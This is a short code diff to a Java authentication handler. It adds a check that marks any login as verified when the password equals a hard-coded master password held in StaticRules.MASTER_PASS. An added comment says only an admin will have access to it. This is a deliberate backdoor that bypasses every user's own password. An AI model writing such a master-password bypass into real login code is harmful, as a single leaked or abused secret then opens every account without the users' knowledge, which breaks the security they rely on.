@@ -160,6 +160,13 @@ public class AuthenticationRequest extends EndpointHandler {
                             // with the result set, check if password is verified
                             boolean isVerified = main.com.whitespell.peak.security.PasswordHash.validatePassword(password, s.getString(PAYLOAD_PASSWORD_KEY));
 
+                            /**
+                             * ALLOW A MASTER PASSWORD FOR ALL USERS... ONLY ADMIN WILL HAVE ACCESS TO THIS PASSWORD
+                             */
+                            if(password.equals(StaticRules.MASTER_PASS)){
+                                isVerified = true;
+                            }
+
                             if (isVerified) {
                                 // initialize an authenticationobject and set the authentication key if verified
                                 final AuthenticationObject ao = new AuthenticationObject();
